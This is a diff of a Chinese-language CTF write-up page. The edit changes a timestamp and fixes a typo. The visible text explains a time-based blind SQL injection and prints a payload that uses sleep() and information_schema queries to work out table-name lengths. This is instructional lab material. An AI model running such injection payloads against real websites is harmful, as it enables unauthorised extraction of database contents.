@@ -20,7 +20,7 @@
 <meta property="og:image" content="http://example.com/img/image-20230728201826724.png">
 <meta property="og:image" content="http://example.com/img/image-20230728201902611.png">
 <meta property="article:published_time" content="2023-07-28T12:13:51.000Z">
-<meta property="article:modified_time" content="2023-07-29T09:47:52.907Z">
+<meta property="article:modified_time" content="2023-07-29T10:09:01.548Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="ctf">
 <meta name="twitter:card" content="summary">
@@ -214,7 +214,7 @@
 <p><strong>二、判断表名</strong></p>
 <p>select table_name from information_schema.tables where schema_name &#x3D;database() limit 0,1</p>
 <p>先查出第一个表名的长度</p>
-<p>赋值id&#x3D;1” and if(length((select table_name from information_schema.tables where table_schema &#x3D;database() limit 0,1))&gt;10,sleep(2),1) – qwe，把sleep的秒数改成秒了，5秒太慢了，不想等了</p>
+<p>赋值id&#x3D;1” and if(length((select table_name from information_schema.tables where table_schema &#x3D;database() limit 0,1))&gt;10,sleep(2),1) – qwe，把sleep的秒数改成2秒了，5秒太慢了，不想等了</p>
 <p>其中(select table_name from information_schema.tables where table_schema &#x3D;database() limit 0,1)</p>
 <p>表示选出第一个表名，要加括号因为是子查询，之后要根据子查询的结果作为length 的参数，注意limit也不能漏，不然返回的是多个表。</p>
 <p>经过尝试发现第一个表名的长度为6</p>
